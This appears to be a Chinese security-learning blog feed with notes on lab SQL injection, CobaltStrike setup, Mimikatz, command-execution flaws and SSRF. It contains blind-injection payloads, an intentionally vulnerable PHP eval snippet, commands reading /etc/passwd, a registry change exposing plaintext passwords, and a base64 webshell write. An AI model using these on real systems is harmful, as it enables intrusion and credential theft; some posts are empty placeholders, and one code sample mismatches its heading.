<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-8</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select  length(column_name)  from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="hljs-string">&#x27; limit 0,1)=2--+</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>

<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/30.png" alt="1646391728435"></p>
<ul>
<li>获取列名名称</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and (select  ascii(substr(column_name,1,1))  from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1)=105--+<br><br></code></pre></td></tr></table></figure>

<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/31.png" alt="1646392542559"></p>
<ul>
<li>获取字段长度</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> length(id) <span class="hljs-keyword">from</span> users limit <span class="hljs-number">12</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span><span class="hljs-number">2</span><span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure>

<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/32.png" alt="1646393476820"></p>
<ul>
<li>获取字段名</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and ascii(substr((select username from users limit 0,1),1,1))=68--+<br><br></code></pre></td></tr></table></figure>

<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/33.png" alt="1646458321889"></p>
<p><strong>重点：</strong></p>
<p><strong>通过查询方式与网站应用得关系注入点产生地方或应用猜测对方查询方式</strong></p>
<p><strong>例如下方的注册页面，对应的就是插入语句 insert</strong> </p>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/34.png" alt="1646154063954"></p>
<h3><span id="sql注入报错盲注">SQL注入—报错盲注</span></h3><p>​        盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行半段或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">基于布尔的SQL盲注-逻辑判断（优先级：2）<br><br>regexp,like,ascii,left,ord,mid<br><br></code></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">基于时间的SQL盲注-延时判断（优先级：3）<br><br>if,sleep<br><br></code></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">基于报错的SQL盲注-报错回显（优先级：1）<br><br>floor，updatexml，extractvalue<br><br></code></pre></td></tr></table></figure>



<h3><span id="12种报错注入万能语句">12种报错注入+万能语句</span></h3><p><a href="https://www.jianshu.com/p/bc35f8dd4f7c">https://www.jianshu.com/p/bc35f8dd4f7c</a></p>
<h3><span id="access偏移注入"><strong>Access偏移注入</strong></span></h3><p>如果遇到列名猜解不到的情况，则可以使用Access偏移注入</p>
<ol>
<li>原理</li>
</ol>
<p><strong>借用数据库的自连接查询让数据库内部发生乱序，从而偏移出所需要的字段在我们的页面上显示</strong></p>
<ol start="2">
<li>用途</li>
</ol>
<p><strong>解决知道Access数据库中知道表名，但是得不到字段的sql注入困境</strong></p>
<ol start="3">
<li>特点</li>
</ol>
<p><strong>a. 成功与否看技巧与运气，不能保证100%成功。</strong></p>
<p><strong>b. 无需管理员账号密码字段，直接爆账号密码</strong></p>
<ol start="4">
<li>利用条件</li>
</ol>
<p><strong>a. 已知管理表名</strong></p>
<p><strong>b. 已知任意字段（一个或多个会增加机率，最常见的就是id）</strong></p>
<ol start="5">
<li>影响偏移注入成功因素</li>
</ol>
<p><strong>a. 管理表的字段数越少越好（最好是三个:id 账号字段 密码字段）</strong></p>
<p><strong>b. 当前注入点的脚本内查询的表内的字段数越多越好</strong></p>
<ol start="6">
<li>流程</li>
</ol>
<p><strong>a. 判断字段数</strong></p>
<p><strong>b. 判断表名</strong></p>
<p><strong>c. 开始偏移注入</strong></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
  </entry>
  <entry>
    <title>WEB安全系列-[信息收集]</title>
    <url>/2022/04/13/WEB%E5%AE%89%E5%85%A8/WEB%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%5D/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
  </entry>
  <entry>
    <title>免杀系列-[Mimikatz]</title>
    <url>/2022/05/04/%E5%85%8D%E6%9D%80%E7%B3%BB%E5%88%97/%E5%85%8D%E6%9D%80%E7%B3%BB%E5%88%97-%5BMimikatz%5D/</url>
    <content><![CDATA[<p><img src="/%E5%85%8D%E6%9D%80%E7%B3%BB%E5%88%97-%5BMimikatz%5D.assets/1653719143042.png" alt="1653719143042"></p>
]]></content>
      <categories>
        <category>免杀系列</category>
      </categories>
  </entry>
  <entry>
    <title>WEB靶场系列[sqli-labs]</title>
    <url>/2022/04/13/WEB%E9%9D%B6%E5%9C%BA/WEB%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%5Bsqli-labs%5D/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>WEB靶场</category>
      </categories>
  </entry>
  <entry>
    <title>内网安全系列-[ARP欺骗]</title>
    <url>/2022/04/15/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BARP%E6%AC%BA%E9%AA%97%5D%20/</url>
    <content><![CDATA[<p>22222收入的分第三方</p>
]]></content>
      <categories>
        <category>内网安全</category>
      </categories>
  </entry>
  <entry>
    <title>内网安全系列-[IPC$入侵]</title>
    <url>/2022/04/13/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BIPC$%E5%85%A5%E4%BE%B5%5D/</url>
    <content><![CDATA[<p>22222收入的分第三方</p>
]]></content>
      <categories>
        <category>内网安全</category>
      </categories>
  </entry>
  <entry>
    <title>内网系列-[IPC入侵机房]</title>
    <url>/2022/04/13/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E7%B3%BB%E5%88%97-%5BIPC%E4%BE%B5%E6%9C%BA%E6%88%BF%5D/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>内网安全</category>
      </categories>
  </entry>
  <entry>
    <title>WEB靶场系列[upload-labs]</title>
    <url>/2022/04/13/WEB%E9%9D%B6%E5%9C%BA/WEB%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%5Bupload-labs%5D/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>WEB靶场</category>
      </categories>
  </entry>
  <entry>
    <title>WEB实战系列-[手工获取外网网站登录名和密码]</title>
    <url>/2022/04/13/%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97/WEB%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%5B%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%8B%BF%E4%B8%8B%E6%BC%82%E4%BA%AE%E5%9B%BD%E7%BD%91%E7%AB%99%5D/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>实战系列</category>
      </categories>
  </entry>
  <entry>
    <title>渗透工具-[CobaltStrike]</title>
    <url>/2022/05/03/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7-%5BCobaltStrike%5D%20/</url>
    <content><![CDATA[<h1><span id="cobaltstrike40环境配置及使用">CobaltStrike4.0环境配置及使用</span></h1><h1><span id="cobaltstrike简介">Cobaltstrike简介</span></h1><blockquote>
<p><strong>Cobalt Strike是一款美国Red Team开发的渗透测试神器，常被业界人称为CS，其拥有多种协议主机上线方式，集成了提权，凭据导出，端口转发，socket代理，office攻击，文件捆绑，钓鱼等功能。分为服务端（teamserver）和客户端，服务端是一个，客户端可以有多个，团队可进行分布式协团操作。客户端可在windows上运行，服务端必须在Linux上，且两者都需Java环境。</strong></p>
</blockquote>
<h1><span id="环境搭建">环境搭建</span></h1><h2><span id="环境搭建">环境搭建</span></h2><p> <strong>下载：<a href="https://zhiji.lanzoui.com/iYOvjp5hqra">CobaltStrike4.0</a> 密码：cs66</strong> </p>
<blockquote>
<p><strong>客户端：win10（自己的主机）</strong></p>
<p><strong>服务端： ubuntu 20.04（国外vps服务器）</strong></p>
</blockquote>
<p>安装java环境<br>客户端windows的java环境配置可以看我前面的文章，这里就不再赘述，下面介绍服务端的配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">进入根目录</span><br>cd /<br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看java是否安装</span><br>java -version<br><span class="hljs-meta prompt_">#</span><span class="language-bash">安装java</span><br>apt install openjdk-14-jre-headless<br><br></code></pre></td></tr></table></figure>



<p> 检查是否安装成功,返回面的内容，说明已经成功了 </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">root@vultr:/# java -version<br>openjdk version &quot;14.0.2&quot; 2020-07-14<br>OpenJDK Runtime Environment (build 14.0.2+12-Ubuntu-120.04)<br>OpenJDK 64-Bit Server VM (build 14.0.2+12-Ubuntu-120.04, mixed mode, sharing)<br></code></pre></td></tr></table></figure>



<p> 环境变量 </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">查看java的安装路径，这里提示我们在链接组java（提供/usr/bin/java）中只有一种选择，所以无需配置环境变量</span><br>root@vultr:/# update-alternatives --config java<br>There is only one alternative in link group java (providing /usr/bin/java): /usr/lib/jvm/java-14-openjdk-amd64/bin/java<br>Nothing to configure.<br><br></code></pre></td></tr></table></figure>





<h3><span id="启动服务端">启动服务端</span></h3><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">给权限</span><br>chmod 777 ./teamserver<br><span class="hljs-meta prompt_">#</span><span class="language-bash">启动服务端</span><br>./teamserver vps的ip 连接密码<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdnwaq/1651669739393.png" alt="1651669739393"></p>
<h3><span id="客户端连接">客户端连接</span></h3><p>这里只需要将host修改为服务器端的ip地址，端口50050固定不（端口确保开启），用户名可以随便起，密码必须写服务器端的密码。</p>
<p>连接成功，服务端搭建完毕</p>
<p><img src="/../../images/xdnwaq/1640500886850.png" alt="1640500886850"></p>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
  </entry>
  <entry>
    <title>渗透工具-[Mimikatz]</title>
    <url>/2022/05/02/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7-%5BMimikatz%5D/</url>
    <content><![CDATA[<p>一、工具简介<br>Mimikatz是法国人benjamin开发的一款功能强大的轻量级调试工具，本意是用来个人测试，但由于其功能强大，能够直接读取WindowsXP-2012等操作系统的明文密码而闻名于渗透测试，可以说是渗透必备工具。</p>
<p>注意：<br>当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f<br></code></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
  </entry>
  <entry>
    <title>Kali汉化中文-[技巧系列]</title>
    <url>/2022/05/11/%E6%8A%80%E5%B7%A7%E7%B3%BB%E5%88%97/Kali%E6%B1%89%E5%8C%96%E4%B8%AD%E6%96%87-%5B%E6%8A%80%E5%B7%A7%E7%B3%BB%E5%88%97%5D/</url>
    <content><![CDATA[<ol>
<li><p>打开终端输入：sudo dpkg-reconfigure locales</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">sudo dpkg-reconfigure locales<br></code></pre></td></tr></table></figure></li>
</ol>
<p><img src="/../../images/jq/1652284493685.png" alt="1652284493685"></p>
<p><img src="/../../images/jq/1652284674948.png" alt="1652284674948"></p>
<p><img src="/../../images/jq/1652284702962.png" alt="1652284702962"></p>
<p>汉化完成</p>
<p><img src="/../../images/jq/1652284751075.png" alt="1652284751075"></p>
]]></content>
      <categories>
        <category>技巧系列</category>
      </categories>
  </entry>
  <entry>
    <title>Linux命令下载文件-[技巧系列]</title>
    <url>/2022/05/12/%E6%8A%80%E5%B7%A7%E7%B3%BB%E5%88%97/Linux%E5%91%BD%E4%BB%A4%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6-%5B%E6%8A%80%E5%B7%A7%E7%B3%BB%E5%88%97%5D/</url>
    <content><![CDATA[<p>wget+文件下载链接</p>
<p><img src="/../../images/jq/1652290754674.png" alt="1652290754674"></p>
]]></content>
      <categories>
        <category>技巧系列</category>
      </categories>
  </entry>
  <entry>
    <title>小迪安全系列-[CRSF]</title>
    <url>/2022/05/14/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BCSRF%5D/</url>
    <content><![CDATA[<img src="../../images/ssrf/nav.gif" alt="nav" style="zoom:00%;">

]]></content>
      <categories>
        <category>小迪安全</category>
      </categories>
  </entry>
  <entry>
    <title>小迪安全系列-[RCE代码执行漏洞]</title>
    <url>/2022/05/15/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BRCE%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%5D/</url>
    <content><![CDATA[<h1><span id="rce-代码及命令执行漏洞全解">RCE 代码及命令执行漏洞全解</span></h1><p>​         在 Web 应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用 代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代 码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏 洞。同样调用系统命令处理，将造成命令执行漏洞。 </p>
<p><img src="/../../images/RCE/1652585977562.png" alt="1652585977562"></p>
<h1><span id="一代码执行漏洞">一，代码执行漏洞</span></h1><p>危害：执行脚本代码</p>
<h2><span id="eval定义和用法">eval定义和用法</span></h2><p>eval() 函数把字符串按照 PHP 代码来计算。</p>
<p>该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;x&#x27;</span>];<br><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><img src="/../../images/RCE/1652587434899.png" alt="1652587434899"></p>
<p><img src="/../../images/RCE/1652602989516.png" alt="1652602989516"></p>
<h1><span id="命令执行漏洞">命令执行漏洞</span></h1><p>危害：执行系统命令</p>
<h2><span id="system定义和用法">system定义和用法</span></h2><p>system函数是将参数当作系统命令执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;x&#x27;</span>];<br><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><strong><img src="/../../images/RCE/1652604516410.png" alt="1652604516410"></strong></p>
<p><img src="/../../images/RCE/1652604634218.png" alt="1652604634218"></p>
<h1><span id="漏洞产生原理">漏洞产生原理</span></h1><h2><span id="代码层面">代码层面：</span></h2><h3><span id="漏洞形成条件">漏洞形成条件</span></h3><h5><span id="可控变量">可控变量</span></h5><ul>
<li>网站中可以传递参数，就如上面的x&#x3D;ipconfig，这就是传递了一个参数</li>
</ul>
<h5><span id="漏洞函数">漏洞函数</span></h5><ul>
<li><p>代码中使用了system函数就会造成可以使用web本地cmd终端</p>
</li>
<li><p>代码中使用eval就会造成将代码类容当作php代码执行</p>
</li>
</ul>
<p><strong>漏洞是否存在是由可控变量决定</strong></p>
<p><strong>漏洞类型是由函数来决定</strong></p>
<p><strong>函数有什么作用，就可能会造成哪一方面的漏洞</strong></p>
<blockquote>
<p><strong>上传的可能造成上传漏洞</strong></p>
<p><strong>做输出的可能会造成xss</strong></p>
<p><strong>做数据库查询的会造成SQL注入</strong></p>
</blockquote>
<h1><span id="二漏洞的产生">二，漏洞的产生</span></h1><h1><span id="三漏洞的检测">三，漏洞的检测</span></h1><p><img src="/../../images/RCE/1652627544287.png" alt="1652627544287"></p>
<h2><span id="白盒">白盒</span></h2><ul>
<li>有源码，从源码中分析，成为代码审计</li>
</ul>
<h2><span id="黑盒">黑盒</span></h2><ul>
<li><p>直接给你个目标，利用漏扫工具，AWVS，AppScan..扫描漏洞</p>
</li>
<li><p>利用网上公开的漏洞检测</p>
</li>
<li><p>手工，根据对方的功能点，来判定</p>
</li>
</ul>
<h1><span id="墨者靶场">墨者靶场</span></h1><blockquote>
<p><strong>墨者靶场黑盒功能点命令执行-应用功能</strong></p>
</blockquote>
<p><img src="/../../images/RCE/1652628527629.png" alt="1652628527629"></p>
<p>漏洞产生条件都具备</p>
<ul>
<li>可控变量</li>
<li>对应函数</li>
</ul>
<p>网站限制了只能一次只能执行一次命令，我们利用Linux管道符命令来一次执行多条命令</p>
<p><img src="/../../images/RCE/1652629097641.png" alt="1652629097641"></p>
<p>前端有限制，使用burp绕过前端</p>
<p><img src="/../../images/RCE/1652629248442.png" alt="1652629248442"></p>
<p>读取文件获得Key</p>
<p><img src="/../../images/RCE/1652629292116.png" alt="1652629292116"></p>
<p>总结：虽然这个靶场很简单，主要功能大概就是，输入一个IP，网站负责帮你ping对方，然后回显给你，通过分析网站的应用功能来着手，通过网站的功能点来分析，可能存在命令执行漏洞</p>
<blockquote>
<p><strong>墨者靶场白盒代码及命令执行-代码分析</strong></p>
</blockquote>
<h1><span id="pikachu靶场">Pikachu靶场</span></h1><p>这个靶场是一个ping的测试</p>
<p>先输入一个回环地址，会先给我们的数据：</p>
<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BRCE%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%5D.assets/1652775900134.png" alt="1652775900134"></p>
<h2><span id="命令执行漏洞攻击">命令执行漏洞攻击</span></h2><h2><span id="linux命令">Linux命令</span></h2><h3><span id="分号">;（分号）</span></h3><p>命令按照顺序（从左到右）被执行，并且可以用分号进行分隔。当有一条命令执行失败时，不会中断其它命令的执行。</p>
<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BRCE%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%5D.assets/1652776183880.png" alt="1652776183880"></p>
<h3><span id="管道符号">|（管道符号）</span></h3><p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BRCE%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%5D.assets/1652776319857.png" alt="1652776319857"></p>
<h3><span id="amp后台任务符号">&amp;（后台任务符号）</span></h3><p>命令按照顺序（从左到右〉被执行，跟分号作用一样;此符号作用是后台任务符号使shell 在后台执行该任务，这样用户就可以立即得到一个提示符并继续其他工作</p>
<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BRCE%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%5D.assets/1652776528860.png" alt="1652776528860"></p>
<h3><span id="ampamp逻辑与">&amp;&amp;（逻辑与）</span></h3><p>前面执行失败后面不执行，前面执行成功后面执行</p>
<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BRCE%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%5D.assets/1652776664300.png" alt="1652776664300"></p>
<h3><span id="逻辑或">||（逻辑或）</span></h3><p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BRCE%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%5D.assets/1652776744350.png" alt="1652776744350"></p>
<h3><span id></span></h3><h3><span id="96反引号">&#96;（反引号）</span></h3><p>当一个命令被解析时，它首先会执行反引号之问的操作。例如执行<code>echo &#39;ls -a&#39;</code>将会首先执行ls并捕获其输出信息。然后再将它传递给echo，并将ls 的输出结果打印在屏幕上，这被称为命令替换</p>
<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BRCE%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%5D.assets/1652776854469.png" alt="1652776854469"></p>
<h3><span id="command-命令替换">$(command) 命令替换</span></h3><p>这是 命令替换的不同符号。当反引号呗过滤或编码时，可能更有效</p>
<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BRCE%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%5D.assets/1652777298814.png" alt="1652777298814"></p>
<h2><span id="windows命令">Windows命令</span></h2><h3><span id="amp后台任务符号">&amp;（后台任务符号）</span></h3><p>命令按照顺序（从左到右〉被执行，跟分号作用一样;此符号作用是后台任务符号使shell 在后台执行该任务，这样用户就可以立即得到一个提示符并继续其他工作</p>
<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BRCE%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%5D.assets/1652777522485.png" alt="1652777522485"></p>
<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BRCE%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%5D.assets/1652777592271.png" alt="1652777592271"></p>
<h1><span id="判断是否存在rce漏洞">判断是否存在RCE漏洞</span></h1><h2><span id="有回显的">有回显的</span></h2><p>发现命令执行漏洞，如果是回显的情况下，获取系统的敏感信息</p>
<p>win操作系统</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">type c:\windows\win.ini<br></code></pre></td></tr></table></figure>

<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BRCE%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%5D.assets/1652777867560.png" alt="1652777867560"></p>
<p>Linux操作系统</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">cat /etc/passwd<br></code></pre></td></tr></table></figure>

<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BRCE%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%5D.assets/1652777890043.png" alt="1652777890043"></p>
<h2><span id="无回显的">无回显的</span></h2><p>有回显的情况下相对较少，一般在实战环境中，无回显得环境较多，证明漏洞存在就需要各种利用外通信技巧</p>
<h3><span id="命令执行漏洞外通信技巧">命令执行漏洞外通信技巧</span></h3><h4><span id="1利用管道符号写入shell">1.利用管道符号写入SHELL</span></h4><p>如果存在漏洞的页面有wcb服务器，有权限写入，利用shcll命令写入 wcbshell后门到网站目录，访问即可获取webshell </p>
<p> echo “phpinfo的base64加密内容”|base64 -d [base64解密]&gt;slell.php[写入文件]</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">echo &quot;PD9waHAgecGhwaW5mbygpO2V2YWwoJF9QTINUWydjbWQnXSk/Pg==&quot;|base64 -d &gt;slell.php<br></code></pre></td></tr></table></figure>

<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BRCE%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%5D.assets/1652916626866.png" alt="1652916626866"></p>
<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BRCE%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%5D.assets/1652916871142.png" alt="1652916871142"></p>
<h4><span id="2dnslog">2.Dnslog</span></h4>]]></content>
      <categories>
        <category>小迪安全</category>
      </categories>
  </entry>
  <entry>
    <title>小迪安全系列-[SSRF]</title>
    <url>/2022/05/14/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BSSRF%5D/</url>
    <content><![CDATA[<h1><span id="ssrf概述"><strong>SSRF概述</strong></span></h1><blockquote>
<p>SSRF(Server-SideRequest Forgery:服务器端请求伪造)是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
</blockquote>
<blockquote>
<p>SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
</blockquote>
<p> <strong>SSRF(Server-Side Request Forgery)，服务器端请求伪造；利用一个可以发起网络请求的服务，可以当做跳板来攻击其他服务。</strong> </p>
<p><img src="/../../images/ssrf/1653216338696.png" alt="1653216338696"></p>
<h1><span id="案例一通过web服务器充当代理访问内网">案例一：通过WEB服务器充当代理访问内网</span></h1><p>分析：例如我要远程上传图片地址，例如地址是<a href="https://img0.baidu.com/a.jpg%EF%BC%8C%E9%82%A3%E4%B9%88%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%82%AF%E5%AE%9A%E8%A6%81%E5%8E%BB%E8%AF%B7%E6%B1%82%E8%A6%81%E5%8E%BB%E8%AE%BF%E9%97%AE%EF%BC%8C%E4%B8%8D%E7%BB%8F%E8%BF%87%E8%AF%B7%E6%B1%82%E6%98%AF%E6%8B%BF%E4%B8%8D%E5%88%B0%E8%BF%99%E4%B8%AA%E5%9B%BE%E7%89%87%E7%9A%84">https://img0.baidu.com/a.jpg，那么服务器肯定要去请求要去访问，不经过请求是拿不到这个图片的</a></p>
<p>既然服务器会去请求地，那么我们输入<a href="http://127.0.0.1呢？">http://127.0.0.1呢？</a></p>
<p><strong>我本地搭建的环境默认端口80就是sql靶场</strong></p>
<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BSSRF%5D.assets/1653215503654.png" alt="1653215503654"></p>
<p>探测端口功能</p>
<p>3306 是mysql数据库端口</p>
<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BSSRF%5D.assets/1653215774197.png" alt="1653215774197"></p>
<p>探针本地file协议</p>
<p>file:&#x2F;&#x2F;&#x2F;D:<a href="http://www.txt/">www.txt</a></p>
<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BSSRF%5D.assets/1653216503828.png" alt="1653216503828"></p>
<p>探针Ftp协议</p>
<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BSSRF%5D.assets/1653216682123.png" alt="1653216682123"></p>
<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BSSRF%5D.assets/1653216672490.png" alt="1653216672490"></p>
<h1><span id="hfs的远程命令执行漏洞rce">HFS的远程命令执行漏洞（RCE）</span></h1><p><strong>一、HFS漏洞</strong></p>
<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BSSRF%5D.assets/1653559115584.png" alt="1653559115584"></p>
<p>1、影响版本 : 2.3c以前的2.3x版本</p>
<p>2、HFS：HFS是HTTP File Server，国外的一款HTTP 文件服务器软件，简单易上手。3、漏洞描述：HTTP File Server是一款专为个人用户所设计的HTTP文件服务器，它提供虚拟档案系统，支持新增、移除虚拟档案资料夹等。</p>
